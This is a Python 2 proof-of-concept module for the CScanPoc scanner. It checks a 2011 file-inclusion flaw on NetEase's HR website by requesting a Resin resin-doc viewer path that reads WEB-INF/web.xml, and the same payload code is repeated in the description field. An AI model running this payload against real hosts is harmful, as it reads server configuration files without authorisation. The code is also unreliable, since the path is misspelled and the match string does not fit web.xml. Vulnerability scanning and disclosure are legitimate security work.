# coding: utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Hr163_0101'  # 平台漏洞编号
    name = '网易hr网站存在文件包含'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2011-07-12'  # 漏洞公布时间
    desc = '''
    网易hr网站存在文件包含漏洞。
    payload = "/resin-doc/viwefile/?contextpath=/&servlet[atj=&file=WEB-INF/web.xml"
            url = self.target + payload
            response = requests.get(url)
            if 'WEB_INF/web/xml' in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=2409
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Hr163'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '15c9cb2d-a2fa-4d23-b9d1-f56159b7aaf5'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/resin-doc/viwefile/?contextpath=/&servlet[atj=&file=WEB-INF/web.xml"
            url = self.target + payload
            response = requests.get(url)
            if 'WEB_INF/web/xml' in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
